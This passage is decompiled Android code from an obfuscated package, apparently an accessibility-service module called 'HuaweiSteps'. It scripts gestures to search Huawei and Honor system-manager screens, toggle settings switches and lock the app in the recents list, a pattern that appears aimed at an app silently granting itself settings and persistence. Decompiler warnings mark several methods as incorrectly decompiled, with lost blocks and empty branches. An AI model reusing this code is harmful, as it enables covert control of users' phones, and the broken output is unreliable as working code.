        handler.postDelayed(runnableC0884n2, 500 + 2000);
        if (!this.f55063a1.dispatchGesture(gestureDescriptionBuild, new m40(handler, runnableC0884n2, ref$BooleanRef, c0530gb), null)) {
            handler.removeCallbacks(runnableC0884n2);
            if (!ref$BooleanRef.f57622a0) {
                ref$BooleanRef.f57622a0 = true;
                t60.m214704c5("HuaweiSteps", "[下滑手势] dispatchGesture返回false");
                int i = Result.f57558a1;
                c0530gb.resumeWith(Boolean.FALSE);
            }
        }
        Object objM212925b5 = c0530gb.m212925b5();
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        return objM212925b5;
    }

    /* renamed from: g1 */
    public final void m212204g1() {
        Path path = new Path();
        path.moveTo(m212181d5() * 0.1f, m212180d4() * 0.7f);
        path.lineTo(m212181d5() * 0.1f, m212180d4() * 0.3f);
        this.f55063a1.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 300L)).build(), null, null);
        SystemClock.sleep(550L);
    }

    /* renamed from: g2 */
    public final void m212205g2() {
        Path path = new Path();
        path.moveTo(m212181d5() * 0.1f, m212180d4() * 0.3f);
        path.lineTo(m212181d5() * 0.1f, m212180d4() * 0.7f);
        this.f55063a1.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 300L)).build(), null, null);
        SystemClock.sleep(550L);
    }

    /* JADX WARN: Removed duplicated region for block: B:16:0x0044  */
    /* JADX WARN: Removed duplicated region for block: B:33:0x0084  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:21:0x0053 -> B:32:0x0082). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:30:0x007a -> B:31:0x007e). Please report as a decompilation issue!!! */
    /* renamed from: g3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212206g3(int i, String str, ContinuationImpl continuationImpl, boolean z) throws Throwable {
        HuaweiSteps$scrollAndClick$1 huaweiSteps$scrollAndClick$1;
        int i2;
        int i3;
        String str2;
        C0365a2 c0365a2;
        if (continuationImpl instanceof HuaweiSteps$scrollAndClick$1) {
            huaweiSteps$scrollAndClick$1 = (HuaweiSteps$scrollAndClick$1) continuationImpl;
            int i4 = huaweiSteps$scrollAndClick$1.f54117a7;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$scrollAndClick$1.f54117a7 = i4 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$scrollAndClick$1 = new HuaweiSteps$scrollAndClick$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$scrollAndClick$1.f54115a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i5 = huaweiSteps$scrollAndClick$1.f54117a7;
        if (i5 == 0) {
            kg1.m213544f4(obj);
            i2 = i;
            i3 = 0;
            str2 = str;
            c0365a2 = this;
            if (i3 >= i2) {
            }
        } else {
            if (i5 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i3 = huaweiSteps$scrollAndClick$1.f54113a3;
            boolean z2 = huaweiSteps$scrollAndClick$1.f54114a4;
            int i6 = huaweiSteps$scrollAndClick$1.f54112a2;
            String str3 = huaweiSteps$scrollAndClick$1.f54111a1;
            c0365a2 = huaweiSteps$scrollAndClick$1.f54110a0;
            kg1.m213544f4(obj);
            int i7 = i6;
            z = z2;
            i2 = i7;
            str2 = str3;
            i3++;
            if (i3 >= i2) {
                tz0.m214807a7("[scrollAndClick] ❌ 未找到: ", str2, "HuaweiSteps");
                return Boolean.FALSE;
            }
            if (c0365a2.m212160a3(str2, z)) {
                return Boolean.TRUE;
            }
            AccessibilityNodeInfo rootInActiveWindow = c0365a2.f55063a1.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                AccessibilityNodeInfo accessibilityNodeInfoM212149c6 = m212149c6(rootInActiveWindow);
                if (accessibilityNodeInfoM212149c6 != null) {
                    accessibilityNodeInfoM212149c6.performAction(Buffer.SEGMENTING_THRESHOLD);
                } else {
                    c0365a2.m212204g1();
                }
                huaweiSteps$scrollAndClick$1.f54110a0 = c0365a2;
                huaweiSteps$scrollAndClick$1.f54111a1 = str2;
                huaweiSteps$scrollAndClick$1.f54112a2 = i2;
                huaweiSteps$scrollAndClick$1.f54114a4 = z;
                huaweiSteps$scrollAndClick$1.f54113a3 = i3;
                huaweiSteps$scrollAndClick$1.f54117a7 = 1;
                if (b81.m210571b1(100L, huaweiSteps$scrollAndClick$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                boolean z3 = z;
                i6 = i2;
                z2 = z3;
                str3 = str2;
                int i72 = i6;
                z = z2;
                i2 = i72;
                str2 = str3;
            }
            i3++;
            if (i3 >= i2) {
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:42:0x011d, code lost:
    
        if (r8.m212217h5(r6, r2) != r3) goto L44;
     */
    /* JADX WARN: Removed duplicated region for block: B:30:0x009a  */
    /* JADX WARN: Removed duplicated region for block: B:32:0x009d  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: g4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212207g4(String str, ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$searchAndClickApp$1 huaweiSteps$searchAndClickApp$1;
        String str2;
        C0365a2 c0365a2;
        C0365a2 c0365a22;
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo accessibilityNodeInfo;
        String str3;
        C0365a2 c0365a23;
        String str4;
        if (continuationImpl instanceof HuaweiSteps$searchAndClickApp$1) {
            huaweiSteps$searchAndClickApp$1 = (HuaweiSteps$searchAndClickApp$1) continuationImpl;
            int i = huaweiSteps$searchAndClickApp$1.f54124a6;
            if ((i & Integer.MIN_VALUE) != 0) {
                huaweiSteps$searchAndClickApp$1.f54124a6 = i - Integer.MIN_VALUE;
            } else {
                huaweiSteps$searchAndClickApp$1 = new HuaweiSteps$searchAndClickApp$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$searchAndClickApp$1.f54122a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = huaweiSteps$searchAndClickApp$1.f54124a6;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            t60.m214704c5("HuaweiSteps", "[搜索] 步骤0: 等待app列表加载");
            huaweiSteps$searchAndClickApp$1.f54118a0 = this;
            str2 = str;
            huaweiSteps$searchAndClickApp$1.f54119a1 = str2;
            huaweiSteps$searchAndClickApp$1.f54124a6 = 1;
            if (m212212h0(huaweiSteps$searchAndClickApp$1) != coroutineSingletons) {
                c0365a2 = this;
            }
            return coroutineSingletons;
        }
        if (i2 == 1) {
            String str5 = huaweiSteps$searchAndClickApp$1.f54119a1;
            c0365a2 = huaweiSteps$searchAndClickApp$1.f54118a0;
            kg1.m213544f4(obj);
            str2 = str5;
        } else {
            if (i2 == 2) {
                String str6 = huaweiSteps$searchAndClickApp$1.f54119a1;
                c0365a22 = huaweiSteps$searchAndClickApp$1.f54118a0;
                kg1.m213544f4(obj);
                str2 = str6;
                rootInActiveWindow = c0365a22.f55063a1.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    return Boolean.FALSE;
                }
                String[] strArr = {"android:id/search_src_text", "com.huawei.systemmanager:id/search_src_text", "com.huawei.systemmanager:id/search_edit_text", "com.hihonor.systemmanager:id/search_src_text", "com.hihonor.systemmanager:id/search_edit_text"};
                for (int i3 = 0; i3 < 5; i3++) {
                    String str7 = strArr[i3];
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str7);
                    t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "searchNodes");
                    if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                        accessibilityNodeInfo = listFindAccessibilityNodeInfosByViewId.get(0);
                        accessibilityNodeInfo.performAction(1);
                        huaweiSteps$searchAndClickApp$1.f54118a0 = c0365a22;
                        huaweiSteps$searchAndClickApp$1.f54119a1 = str2;
                        huaweiSteps$searchAndClickApp$1.f54120a2 = str7;
                        huaweiSteps$searchAndClickApp$1.f54121a3 = accessibilityNodeInfo;
                        huaweiSteps$searchAndClickApp$1.f54124a6 = 3;
                        if (b81.m210571b1(100L, huaweiSteps$searchAndClickApp$1) != coroutineSingletons) {
                            str3 = str2;
                            c0365a23 = c0365a22;
                            str4 = str7;
                            Bundle bundle = new Bundle();
                            bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str3);
                            accessibilityNodeInfo.performAction(2097152, bundle);
                            t60.m214704c5("HuaweiSteps", "[搜索] 步骤2: 输入'" + str3 + "' (使用 " + str4 + ")");
                            huaweiSteps$searchAndClickApp$1.f54118a0 = null;
                            huaweiSteps$searchAndClickApp$1.f54119a1 = null;
                            huaweiSteps$searchAndClickApp$1.f54120a2 = null;
                            huaweiSteps$searchAndClickApp$1.f54121a3 = null;
                            huaweiSteps$searchAndClickApp$1.f54124a6 = 4;
                        }
                        return coroutineSingletons;
                    }
                }
                t60.m214704c5("HuaweiSteps", "[搜索] 未找到搜索框");
                return Boolean.FALSE;
            }
            if (i2 != 3) {
                if (i2 != 4) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                return Boolean.TRUE;
            }
            accessibilityNodeInfo = huaweiSteps$searchAndClickApp$1.f54121a3;
            str4 = huaweiSteps$searchAndClickApp$1.f54120a2;
            str3 = huaweiSteps$searchAndClickApp$1.f54119a1;
            c0365a23 = huaweiSteps$searchAndClickApp$1.f54118a0;
            kg1.m213544f4(obj);
            Bundle bundle2 = new Bundle();
            bundle2.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str3);
            accessibilityNodeInfo.performAction(2097152, bundle2);
            t60.m214704c5("HuaweiSteps", "[搜索] 步骤2: 输入'" + str3 + "' (使用 " + str4 + ")");
            huaweiSteps$searchAndClickApp$1.f54118a0 = null;
            huaweiSteps$searchAndClickApp$1.f54119a1 = null;
            huaweiSteps$searchAndClickApp$1.f54120a2 = null;
            huaweiSteps$searchAndClickApp$1.f54121a3 = null;
            huaweiSteps$searchAndClickApp$1.f54124a6 = 4;
        }
        t60.m214704c5("HuaweiSteps", "[搜索] 步骤1: 点击'搜索应用'");
        c0365a2.m212160a3("搜索应用", true);
        huaweiSteps$searchAndClickApp$1.f54118a0 = c0365a2;
        huaweiSteps$searchAndClickApp$1.f54119a1 = str2;
        huaweiSteps$searchAndClickApp$1.f54124a6 = 2;
        if (b81.m210571b1(100L, huaweiSteps$searchAndClickApp$1) != coroutineSingletons) {
            c0365a22 = c0365a2;
            rootInActiveWindow = c0365a22.f55063a1.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
            }
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r13v2, types: [java.lang.StringBuilder] */
    /* JADX WARN: Type inference failed for: r7v10, types: [int] */
    /* JADX WARN: Type inference failed for: r7v13 */
    /* JADX WARN: Type inference failed for: r7v9 */
    /* renamed from: g6 */
    public final boolean m212208g6(String str, boolean z) {
        boolean z2;
        AccessibilityNodeInfo accessibilityNodeInfoM212176c7;
        boolean z3;
        AccessibilityService accessibilityService = this.f55063a1;
        AccessibilityNodeInfo rootInActiveWindow = accessibilityService.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        String string = AbstractC0779a1.m213687e0(str).toString();
        t60.m214704c5("HuaweiSteps", "[toggleSwitch] 查找: '" + string + "', 目标状态: " + z);
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(string);
        t60.m214704c5("HuaweiSteps", "[toggleSwitch] 找到 " + (listFindAccessibilityNodeInfosByText != null ? listFindAccessibilityNodeInfosByText.size() : 0) + " 个文本节点");
        Iterator<AccessibilityNodeInfo> it = listFindAccessibilityNodeInfosByText.iterator();
        while (true) {
            boolean zHasNext = it.hasNext();
            HuaweiSteps$VerifyResult huaweiSteps$VerifyResult = HuaweiSteps$VerifyResult.f53982a1;
            if (!zHasNext) {
                z2 = true;
                AccessibilityNodeInfo accessibilityNodeInfoM212147c4 = m212147c4(rootInActiveWindow, str);
                if (accessibilityNodeInfoM212147c4 != null && (accessibilityNodeInfoM212176c7 = m212176c7(accessibilityNodeInfoM212147c4)) != null) {
                    if (accessibilityNodeInfoM212176c7.isChecked() == z) {
                        tz0.m214809a9("[toggleSwitch] ✅ ", str, " 已是目标状态（通过desc找到）", "HuaweiSteps");
                        return true;
                    }
                    if (!AbstractC0003a2.m24a5(accessibilityNodeInfoM212176c7).isEmpty()) {
                        Path path = new Path();
                        path.moveTo(r4.centerX(), r4.centerY());
                        GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 50L)).build();
                        SystemClock.sleep(50L);
                        accessibilityService.dispatchGesture(gestureDescriptionBuild, null, null);
                        m212156g5();
                        t60.m214704c5("HuaweiSteps", "[toggleSwitch] ✅ " + str + ": 通过desc坐标点击成功");
                        if (m212210g8(str, z) != huaweiSteps$VerifyResult) {
                            break;
                        }
                        return false;
                    }
                }
                t60.m214704c5("HuaweiSteps", "[toggleSwitch] ❌ 未找到开关: ".concat(str));
                return false;
            }
            AccessibilityNodeInfo next = it.next();
            if (next.isVisibleToUser()) {
                AccessibilityNodeInfo accessibilityNodeInfoM212176c72 = m212176c7(next);
                if (accessibilityNodeInfoM212176c72 != null) {
                    boolean zIsChecked = accessibilityNodeInfoM212176c72.isChecked();
                    z3 = false;
                    z2 = true;
                    t60.m214704c5("HuaweiSteps", "[toggleSwitch] 找到开关: 当前状态=" + zIsChecked + ", class=" + ((Object) accessibilityNodeInfoM212176c72.getClassName()));
                    if (zIsChecked == z) {
                        t60.m214704c5("HuaweiSteps", "[toggleSwitch] ✅ " + str + " 已是目标状态: " + zIsChecked);
                        return true;
                    }
                    Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfoM212176c72);
                    if (!rectM24a5.isEmpty() && rectM24a5.width() > 0 && rectM24a5.height() > 0) {
                        int iCenterX = rectM24a5.centerX();
                        int iCenterY = rectM24a5.centerY();
                        t60.m214704c5("HuaweiSteps", AbstractC0003a2.m31b2("[toggleSwitch] 方法1-坐标点击: (", iCenterX, ", ", iCenterY, ")"));
                        Path path2 = new Path();
                        path2.moveTo(iCenterX, iCenterY);
                        accessibilityService.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path2, 10L, 50L)).build(), null, null);
                        m212156g5();
                        HuaweiSteps$VerifyResult huaweiSteps$VerifyResultM212210g8 = m212210g8(str, z);
                        if (huaweiSteps$VerifyResultM212210g8 != huaweiSteps$VerifyResult) {
                            t60.m214704c5("HuaweiSteps", "[toggleSwitch] ✅ " + str + ": 坐标点击成功 (result=" + huaweiSteps$VerifyResultM212210g8 + ")");
                            return true;
                        }
                        t60.m214704c5("HuaweiSteps", "[toggleSwitch] ⚠️ 坐标点击后状态未变，尝试节点点击");
                    }
                    t60.m214704c5("HuaweiSteps", "[toggleSwitch] 方法2-节点点击");
                    if (accessibilityNodeInfoM212176c72.performAction(16)) {
                        t60.m214704c5("HuaweiSteps", "[toggleSwitch] ✅ " + str + ": 节点点击执行");
                        m212156g5();
                        if (m212210g8(str, z) == huaweiSteps$VerifyResult) {
                            break;
                            break;
                        }
                        break;
                    }
                } else {
                    z3 = false;
                    z2 = true;
                }
                AccessibilityNodeInfo parent = next.getParent();
                for (?? r7 = z3; r7 < 5 && parent != null; r7++) {
                    AccessibilityNodeInfo accessibilityNodeInfoM212177c8 = m212177c8(parent);
                    if (accessibilityNodeInfoM212177c8 != null) {
                        boolean zIsChecked2 = accessibilityNodeInfoM212177c8.isChecked();
                        t60.m214704c5("HuaweiSteps", "[toggleSwitch] 找到开关(递归): level=" + r7 + ", 当前状态=" + zIsChecked2);
                        if (zIsChecked2 == z) {
                            tz0.m214809a9("[toggleSwitch] ✅ ", str, " 已是目标状态", "HuaweiSteps");
                            return z2;
                        }
                        if (accessibilityNodeInfoM212177c8.performAction(16)) {
                            m212156g5();
                            if (m212210g8(str, z) != huaweiSteps$VerifyResult) {
                                break;
                            }
                            return z3;
                        }
                    }
                    parent = parent.getParent();
                }
            }
        }
        return z2;
    }

    /* JADX WARN: Code restructure failed: missing block: B:99:0x01ca, code lost:
    
        if (p000.b81.m210571b1(500, r3) == r4) goto L100;
     */
    /* JADX WARN: Removed duplicated region for block: B:113:0x01f9 A[Catch: Exception -> 0x003d, TRY_LEAVE, TryCatch #0 {Exception -> 0x003d, blocks: (B:13:0x0038, B:101:0x01cd, B:105:0x01db, B:107:0x01e3, B:108:0x01e8, B:109:0x01e9, B:111:0x01f1, B:18:0x0042, B:94:0x01af, B:96:0x01b7, B:98:0x01bf, B:21:0x0049, B:85:0x0158, B:87:0x0163, B:89:0x017f, B:91:0x0187, B:113:0x01f9, B:24:0x0050, B:82:0x0142, B:27:0x0057, B:44:0x00a2, B:46:0x00ab, B:48:0x00b1, B:51:0x00b9, B:53:0x00c1, B:55:0x00c9, B:57:0x00d1, B:61:0x00dc, B:62:0x00f4, B:64:0x00fa, B:66:0x0106, B:69:0x010d, B:70:0x0111, B:72:0x0117, B:75:0x0124, B:77:0x0129, B:79:0x0131, B:30:0x005d, B:41:0x008c, B:33:0x0064, B:35:0x0074, B:37:0x007d, B:36:0x0078), top: B:117:0x002b }] */
    /* JADX WARN: Removed duplicated region for block: B:43:0x00a0  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x00a2 A[Catch: Exception -> 0x003d, PHI: r2
      0x00a2: PHI (r2v5 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v3 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v6 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:42:0x009e, B:27:0x0057] A[DONT_GENERATE, DONT_INLINE], TryCatch #0 {Exception -> 0x003d, blocks: (B:13:0x0038, B:101:0x01cd, B:105:0x01db, B:107:0x01e3, B:108:0x01e8, B:109:0x01e9, B:111:0x01f1, B:18:0x0042, B:94:0x01af, B:96:0x01b7, B:98:0x01bf, B:21:0x0049, B:85:0x0158, B:87:0x0163, B:89:0x017f, B:91:0x0187, B:113:0x01f9, B:24:0x0050, B:82:0x0142, B:27:0x0057, B:44:0x00a2, B:46:0x00ab, B:48:0x00b1, B:51:0x00b9, B:53:0x00c1, B:55:0x00c9, B:57:0x00d1, B:61:0x00dc, B:62:0x00f4, B:64:0x00fa, B:66:0x0106, B:69:0x010d, B:70:0x0111, B:72:0x0117, B:75:0x0124, B:77:0x0129, B:79:0x0131, B:30:0x005d, B:41:0x008c, B:33:0x0064, B:35:0x0074, B:37:0x007d, B:36:0x0078), top: B:117:0x002b }] */
    /* JADX WARN: Removed duplicated region for block: B:46:0x00ab A[Catch: Exception -> 0x003d, TryCatch #0 {Exception -> 0x003d, blocks: (B:13:0x0038, B:101:0x01cd, B:105:0x01db, B:107:0x01e3, B:108:0x01e8, B:109:0x01e9, B:111:0x01f1, B:18:0x0042, B:94:0x01af, B:96:0x01b7, B:98:0x01bf, B:21:0x0049, B:85:0x0158, B:87:0x0163, B:89:0x017f, B:91:0x0187, B:113:0x01f9, B:24:0x0050, B:82:0x0142, B:27:0x0057, B:44:0x00a2, B:46:0x00ab, B:48:0x00b1, B:51:0x00b9, B:53:0x00c1, B:55:0x00c9, B:57:0x00d1, B:61:0x00dc, B:62:0x00f4, B:64:0x00fa, B:66:0x0106, B:69:0x010d, B:70:0x0111, B:72:0x0117, B:75:0x0124, B:77:0x0129, B:79:0x0131, B:30:0x005d, B:41:0x008c, B:33:0x0064, B:35:0x0074, B:37:0x007d, B:36:0x0078), top: B:117:0x002b }] */
    /* JADX WARN: Removed duplicated region for block: B:77:0x0129 A[Catch: Exception -> 0x003d, TryCatch #0 {Exception -> 0x003d, blocks: (B:13:0x0038, B:101:0x01cd, B:105:0x01db, B:107:0x01e3, B:108:0x01e8, B:109:0x01e9, B:111:0x01f1, B:18:0x0042, B:94:0x01af, B:96:0x01b7, B:98:0x01bf, B:21:0x0049, B:85:0x0158, B:87:0x0163, B:89:0x017f, B:91:0x0187, B:113:0x01f9, B:24:0x0050, B:82:0x0142, B:27:0x0057, B:44:0x00a2, B:46:0x00ab, B:48:0x00b1, B:51:0x00b9, B:53:0x00c1, B:55:0x00c9, B:57:0x00d1, B:61:0x00dc, B:62:0x00f4, B:64:0x00fa, B:66:0x0106, B:69:0x010d, B:70:0x0111, B:72:0x0117, B:75:0x0124, B:77:0x0129, B:79:0x0131, B:30:0x005d, B:41:0x008c, B:33:0x0064, B:35:0x0074, B:37:0x007d, B:36:0x0078), top: B:117:0x002b }] */
    /* JADX WARN: Removed duplicated region for block: B:79:0x0131 A[Catch: Exception -> 0x003d, TryCatch #0 {Exception -> 0x003d, blocks: (B:13:0x0038, B:101:0x01cd, B:105:0x01db, B:107:0x01e3, B:108:0x01e8, B:109:0x01e9, B:111:0x01f1, B:18:0x0042, B:94:0x01af, B:96:0x01b7, B:98:0x01bf, B:21:0x0049, B:85:0x0158, B:87:0x0163, B:89:0x017f, B:91:0x0187, B:113:0x01f9, B:24:0x0050, B:82:0x0142, B:27:0x0057, B:44:0x00a2, B:46:0x00ab, B:48:0x00b1, B:51:0x00b9, B:53:0x00c1, B:55:0x00c9, B:57:0x00d1, B:61:0x00dc, B:62:0x00f4, B:64:0x00fa, B:66:0x0106, B:69:0x010d, B:70:0x0111, B:72:0x0117, B:75:0x0124, B:77:0x0129, B:79:0x0131, B:30:0x005d, B:41:0x008c, B:33:0x0064, B:35:0x0074, B:37:0x007d, B:36:0x0078), top: B:117:0x002b }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:84:0x0157  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x0158 A[Catch: Exception -> 0x003d, PHI: r2
      0x0158: PHI (r2v9 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v7 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v10 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:83:0x0155, B:21:0x0049] A[DONT_GENERATE, DONT_INLINE], TryCatch #0 {Exception -> 0x003d, blocks: (B:13:0x0038, B:101:0x01cd, B:105:0x01db, B:107:0x01e3, B:108:0x01e8, B:109:0x01e9, B:111:0x01f1, B:18:0x0042, B:94:0x01af, B:96:0x01b7, B:98:0x01bf, B:21:0x0049, B:85:0x0158, B:87:0x0163, B:89:0x017f, B:91:0x0187, B:113:0x01f9, B:24:0x0050, B:82:0x0142, B:27:0x0057, B:44:0x00a2, B:46:0x00ab, B:48:0x00b1, B:51:0x00b9, B:53:0x00c1, B:55:0x00c9, B:57:0x00d1, B:61:0x00dc, B:62:0x00f4, B:64:0x00fa, B:66:0x0106, B:69:0x010d, B:70:0x0111, B:72:0x0117, B:75:0x0124, B:77:0x0129, B:79:0x0131, B:30:0x005d, B:41:0x008c, B:33:0x0064, B:35:0x0074, B:37:0x007d, B:36:0x0078), top: B:117:0x002b }] */
    /* JADX WARN: Removed duplicated region for block: B:87:0x0163 A[Catch: Exception -> 0x003d, TryCatch #0 {Exception -> 0x003d, blocks: (B:13:0x0038, B:101:0x01cd, B:105:0x01db, B:107:0x01e3, B:108:0x01e8, B:109:0x01e9, B:111:0x01f1, B:18:0x0042, B:94:0x01af, B:96:0x01b7, B:98:0x01bf, B:21:0x0049, B:85:0x0158, B:87:0x0163, B:89:0x017f, B:91:0x0187, B:113:0x01f9, B:24:0x0050, B:82:0x0142, B:27:0x0057, B:44:0x00a2, B:46:0x00ab, B:48:0x00b1, B:51:0x00b9, B:53:0x00c1, B:55:0x00c9, B:57:0x00d1, B:61:0x00dc, B:62:0x00f4, B:64:0x00fa, B:66:0x0106, B:69:0x010d, B:70:0x0111, B:72:0x0117, B:75:0x0124, B:77:0x0129, B:79:0x0131, B:30:0x005d, B:41:0x008c, B:33:0x0064, B:35:0x0074, B:37:0x007d, B:36:0x0078), top: B:117:0x002b }] */
    /* JADX WARN: Removed duplicated region for block: B:96:0x01b7 A[Catch: Exception -> 0x003d, TryCatch #0 {Exception -> 0x003d, blocks: (B:13:0x0038, B:101:0x01cd, B:105:0x01db, B:107:0x01e3, B:108:0x01e8, B:109:0x01e9, B:111:0x01f1, B:18:0x0042, B:94:0x01af, B:96:0x01b7, B:98:0x01bf, B:21:0x0049, B:85:0x0158, B:87:0x0163, B:89:0x017f, B:91:0x0187, B:113:0x01f9, B:24:0x0050, B:82:0x0142, B:27:0x0057, B:44:0x00a2, B:46:0x00ab, B:48:0x00b1, B:51:0x00b9, B:53:0x00c1, B:55:0x00c9, B:57:0x00d1, B:61:0x00dc, B:62:0x00f4, B:64:0x00fa, B:66:0x0106, B:69:0x010d, B:70:0x0111, B:72:0x0117, B:75:0x0124, B:77:0x0129, B:79:0x0131, B:30:0x005d, B:41:0x008c, B:33:0x0064, B:35:0x0074, B:37:0x007d, B:36:0x0078), top: B:117:0x002b }] */
    /* JADX WARN: Removed duplicated region for block: B:98:0x01bf A[Catch: Exception -> 0x003d, TryCatch #0 {Exception -> 0x003d, blocks: (B:13:0x0038, B:101:0x01cd, B:105:0x01db, B:107:0x01e3, B:108:0x01e8, B:109:0x01e9, B:111:0x01f1, B:18:0x0042, B:94:0x01af, B:96:0x01b7, B:98:0x01bf, B:21:0x0049, B:85:0x0158, B:87:0x0163, B:89:0x017f, B:91:0x0187, B:113:0x01f9, B:24:0x0050, B:82:0x0142, B:27:0x0057, B:44:0x00a2, B:46:0x00ab, B:48:0x00b1, B:51:0x00b9, B:53:0x00c1, B:55:0x00c9, B:57:0x00d1, B:61:0x00dc, B:62:0x00f4, B:64:0x00fa, B:66:0x0106, B:69:0x010d, B:70:0x0111, B:72:0x0117, B:75:0x0124, B:77:0x0129, B:79:0x0131, B:30:0x005d, B:41:0x008c, B:33:0x0064, B:35:0x0074, B:37:0x007d, B:36:0x0078), top: B:117:0x002b }] */
    /* renamed from: g7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212209g7(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$tryLockAppInRecents$1 huaweiSteps$tryLockAppInRecents$1;
        C0365a2 c0365a2;
        AccessibilityNodeInfo rootInActiveWindow;
        boolean z;
        String string;
        Rect rectM212175c2;
        Context context = this.f55062a0;
        if (continuationImpl instanceof HuaweiSteps$tryLockAppInRecents$1) {
            huaweiSteps$tryLockAppInRecents$1 = (HuaweiSteps$tryLockAppInRecents$1) continuationImpl;
            int i = huaweiSteps$tryLockAppInRecents$1.f54128a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                huaweiSteps$tryLockAppInRecents$1.f54128a3 = i - Integer.MIN_VALUE;
            } else {
                huaweiSteps$tryLockAppInRecents$1 = new HuaweiSteps$tryLockAppInRecents$1(this, continuationImpl);
            }
        }
        Object objM212203g0 = huaweiSteps$tryLockAppInRecents$1.f54126a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        try {
            switch (huaweiSteps$tryLockAppInRecents$1.f54128a3) {
                case 0:
                    kg1.m213544f4(objM212203g0);
                    t60.m214704c5("HuaweiSteps", "[锁定流程] 1. 返回APP前台");
                    Intent intentM211757a1 = new C0328b3(context).m211757a1();
                    if (intentM211757a1 != null) {
                        context.startActivity(intentM211757a1);
                    } else {
                        t60.m214726f4("HuaweiSteps", "[锁定流程] 无可用的启动 Activity，跳过返回前台");
                    }
                    huaweiSteps$tryLockAppInRecents$1.f54125a0 = this;
                    huaweiSteps$tryLockAppInRecents$1.f54128a3 = 1;
                    if (b81.m210571b1(100L, huaweiSteps$tryLockAppInRecents$1) == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    c0365a2 = this;
                    t60.m214704c5("HuaweiSteps", "[锁定流程] 2. 打开最近任务列表");
                    c0365a2.f55063a1.performGlobalAction(3);
                    huaweiSteps$tryLockAppInRecents$1.f54125a0 = c0365a2;
                    huaweiSteps$tryLockAppInRecents$1.f54128a3 = 2;
                    if (b81.m210571b1(300L, huaweiSteps$tryLockAppInRecents$1) == coroutineSingletons) {
                        rootInActiveWindow = c0365a2.f55063a1.getRootInActiveWindow();
                        if (rootInActiveWindow != null) {
                            CharSequence packageName = rootInActiveWindow.getPackageName();
                            if (packageName == null || (string = packageName.toString()) == null) {
                                string = "";
                            }
                            z = string.equals("com.huawei.android.launcher") || string.equals("com.hihonor.android.launcher") || AbstractC0779a1.m213652a5(string, "launcher", false) || AbstractC0779a1.m213652a5(string, "recents", false);
                            if (!z) {
                                Iterator it = AbstractC0716jf.m213306g5("清空", "一键清理", "全部清理", "清除", "清理", "关闭全部").iterator();
                                while (true) {
                                    if (it.hasNext()) {
                                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it.next());
                                        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                            Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                                            while (it2.hasNext()) {
                                                if (((AccessibilityNodeInfo) it2.next()).isVisibleToUser()) {
                                                    z = true;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            rootInActiveWindow.recycle();
                        }
                        if (z) {
                            t60.m214704c5("HuaweiSteps", "[锁定流程] 未能打开最近任务列表");
                            return Boolean.FALSE;
                        }
